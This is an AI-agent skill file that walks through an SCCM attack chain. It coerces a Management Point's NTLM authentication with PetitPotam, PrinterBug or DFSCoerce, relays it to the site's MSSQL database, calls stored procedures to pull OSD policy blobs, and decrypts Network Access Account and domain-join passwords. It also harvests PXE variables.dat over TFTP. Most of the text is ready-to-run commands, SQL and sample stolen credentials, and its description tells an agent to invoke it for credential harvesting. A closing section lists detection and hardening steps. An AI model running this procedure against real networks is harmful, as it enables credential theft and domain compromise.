---
name: sccm-mp-relay-extraction
description: Extract SCCM OSD policy secrets by relaying Management Point NTLM authentication to the site database. Use this skill whenever the user mentions SCCM, Configuration Manager, OSD secrets, policy extraction, NTLM relay to MSSQL, or wants to extract Network Access Account credentials, Task Sequence variables, or join account passwords from SCCM. Make sure to use this skill for any SCCM-related reconnaissance, credential harvesting, or policy extraction tasks.
---

# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

This skill guides you through extracting Operating System Deployment (OSD) policy secrets from System Center Configuration Manager (SCCM) by coercing a Management Point (MP) to authenticate over SMB/RPC and relaying that NTLM machine account to the site database (MSSQL).

## Attack Overview

The Management Point's `smsdbrole_MP` / `smsdbrole_MPUserSvc` database roles allow calling stored procedures that expose OSD policy blobs. These blobs contain Network Access Account credentials, Task-Sequence variables, and other secrets that can be decoded and decrypted.

**High-level chain:**
1. Discover MP & site database via unauthenticated HTTP endpoint
2. Start NTLM relay listener (SMB→TDS)
3. Coerce MP using PetitPotam, PrinterBug, DFSCoerce, etc.
4. Connect to MSSQL through SOCKS proxy as relayed machine account
5. Execute stored procedures to retrieve policy bodies
6. Decode and decrypt blobs to extract plaintext secrets

## Prerequisites

- Network access to SCCM Management Point
- Network access to SCCM site database (MSSQL)
- NTLM relay tool (impacket's `ntlmrelayx.py`)
- Coercion tool (PetitPotam, PrinterBug, DFSCoerce, etc.)
- `mssqlclient.py` from impacket
- `pxethief.py` for decryption
- `proxychains` or SOCKS proxy configuration

## Phase 1: Enumerate Unauthenticated MP Endpoints

The MP ISAPI extension `GetAuth.dll` exposes parameters that don't require authentication (unless PKI-only):

### Get Site Information and Unknown Computer GUIDs

```bash
# Returns site signing cert public key + GUIDs of x86/x64 All Unknown Computers
curl http://<MP-FQDN>/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```

Extract the GUIDs - these will be your `clientID` for later database queries.

### List All Management Points

```bash
curl http://<MP-FQDN>/SMS_MP/.sms_aut?MPLIST | xmllint --format -
```

### Get Site Signing Certificate

```bash
curl http://<MP-FQDN>/SMS_MP/.sms_aut?SITESIGNCERT | xmllint --format -
```

This helps identify the site server without LDAP access.

## Phase 2: Relay MP Machine Account to MSSQL

### Start the Relay Listener

```bash
# SMB→TDS relay with SOCKS proxy
ntlmrelayx.py -ts -t mssql://<SiteDB-IP> -socks -smb2support
```

### Trigger Authentication from MP

Choose a coercion method based on your environment:

**PetitPotam (MS-EFSR):**
```bash
python3 PetitPotam.py <MP-IP> <Attacker-IP> \
       -u <username> -p <password> -d <DOMAIN> -dc-ip <DC-IP>
```

**PrinterBug (MS-RPRN):**
```bash
python3 PrinterBug.py <MP-IP> <Attacker-IP> \
       -u <username> -p <password> -d <DOMAIN> -dc-ip <DC-IP>
```

**DFSCoerce (MS-RDRA):**
```bash
python3 DFSCoerce.py <MP-IP> <Attacker-IP> \
       -u <username> -p <password> -d <DOMAIN> -dc-ip <DC-IP>
```

### Verify Successful Relay

Look for output like:
```
[*] Authenticating against mssql://<IP> as <DOMAIN>/<MP-host>$ SUCCEED
[*] SOCKS: Adding <DOMAIN>/<MP-host>$@<IP>(1433)
```

## Phase 3: Query OSD Policies via Stored Procedures

### Connect Through SOCKS Proxy

```bash
# Default SOCKS port is 1080
proxychains mssqlclient.py <DOMAIN>/<MP-host>$@<SiteDB-IP> -windows-auth
```

### Switch to Site Database

```sql
USE CM_<SiteCode>;
-- SiteCode is typically 3 characters, e.g., CM_001, CM_ABC
```

### Find Unknown Computer GUIDs (Optional)

```sql
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```

### List Assigned Policies

```sql
EXEC MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>', N'';
```

Each row contains:
- `PolicyAssignmentID`
- `Body` (hex-encoded policy blob)
- `PolicyID`
- `PolicyVersion`

**Target policies:**
- `NAAConfig` – Network Access Account credentials
- `TS_Sequence` – Task Sequence variables (OSDJoinAccount/Password)
- `CollectionSettings` – May contain run-as accounts

### Retrieve Full Policy Body

If you have `PolicyID` and `PolicyVersion`, you can skip the clientID requirement:

```sql
EXEC MP_GetPolicyBody N'<PolicyID>', N'<PolicyVersion>';
```

Or use the authorization variant:

```sql
EXEC MP_GetPolicyBodyAfterAuthorization N'<PolicyID>', N'<PolicyVersion>';
```

> **IMPORTANT:** In SSMS, increase "Maximum Characters Retrieved" to >65535 or the blob will be truncated.

## Phase 4: Decode and Decrypt Policy Blobs

### Remove BOM and Convert Hex to XML

```bash
# The blob starts with 0xFFFE (UTF-16 LE BOM)
echo '<hex-blob>' | xxd -r -p > policy.xml
```

### Decrypt with PXEthief

```bash
# Extract the encrypted value from XML
ENCRYPTED_VALUE=$(xmlstarlet sel -t -v "//value/text()" policy.xml)

# Decrypt (7 = decrypt attribute value)
python3 pxethief.py 7 "$ENCRYPTED_VALUE"
```

### Expected Output

```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```

## Phase 5: PXE Boot Media Harvesting (Optional)

For additional secrets, you can harvest PXE boot media:

### Send PXE Boot Request

```bash
# Send request to Distribution Point on UDP/4011
# Response reveals boot paths and optional encrypted key blob
```

### Retrieve Boot Artifacts via TFTP

```bash
# Download variables.dat (unauthenticated TFTP)
tftp <DP-IP> -c get "SMSBoot\\x64\\pxe\\variables.dat"
```

### Decrypt or Crack

**With key:**
```bash
# Feed key to SharpPXE for direct decryption
```

**Without key:**
```bash
# SharpPXE emits Hashcat-compatible hash
# Format: $sccm$aes128$...
# Crack with Hashcat, then decrypt
```

### Parse Decrypted XML

SharpPXE parses the decrypted XML and prints a ready-to-run SharpSCCM command with GUID/PFX/site parameters prefilled.

## Relevant SQL Roles and Procedures

Upon relay, the login is mapped to:
- `smsdbrole_MP`
- `smsdbrole_MPUserSvc`

### Key Stored Procedures

| Procedure | Purpose |
|-----------|----------|
| `MP_GetMachinePolicyAssignments` | List policies applied to a clientID |
| `MP_GetPolicyBody` | Return complete policy body |
| `MP_GetPolicyBodyAfterAuthorization` | Return policy body (authorization variant) |
| `MP_GetListOfMPsInSiteOSD` | List MPs in site (returned by MPKEYINFORMATIONMEDIA) |

### Inspect Full Permission List

```sql
SELECT pr.name
FROM sys.database_principals AS dp
JOIN sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN sys.objects AS pr ON pr.object_id = pe.major_id
WHERE dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
  AND pe.permission_name='EXECUTE';
```

## Detection and Hardening

### Detection Indicators

1. **Monitor MP logins** – Any MP computer account logging in from an IP that isn't its host indicates relay
2. **Unusual TFTP downloads** – Alert on TFTP downloads of `SMSBoot\*\pxe\variables.dat`
3. **Stored procedure execution** – Monitor for `MP_GetPolicyBody` calls from unexpected sources

### Hardening Recommendations

1. **Enable Extended Protection for Authentication (EPA)** on the site database (PREVENT-14)
2. **Disable unused NTLM** and enforce SMB signing
3. **Restrict RPC** endpoints (same mitigations used against PetitPotam/PrinterBug)
4. **Harden MP ↔ DB communication** with IPSec or mutual-TLS
5. **Constrain PXE exposure** – Firewall UDP/4011 and TFTP to trusted VLANs, require PXE passwords

## Common Issues and Troubleshooting

### Policy Body Truncated

**Problem:** The returned blob is cut off at 65535 characters.

**Solution:** In SSMS, go to Tools → Options → Query Results → SQL Server → Results → Increase "Maximum Characters Retrieved" to 32767 or higher.

### Relay Fails

**Problem:** `ntlmrelayx.py` doesn't receive authentication.

**Solutions:**
- Verify the MP can reach your attacker IP on SMB/RPC ports
- Try different coercion methods (PetitPotam, PrinterBug, DFSCoerce)
- Check firewall rules between MP and attacker
- Ensure the MP has network access to the MSSQL server

### Decryption Fails

**Problem:** PXEthief returns an error or garbage output.

**Solutions:**
- Verify the BOM was properly removed (first 2 bytes: `FF FE`)
- Ensure the hex string is clean (no whitespace, newlines)
- Check that you're using the correct PXEthief mode (7 for attribute values)
- Verify the policy body wasn't truncated

## References

- [I'd Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
- [Impacket ntlmrelayx.py](https://github.com/fortra/impacket)
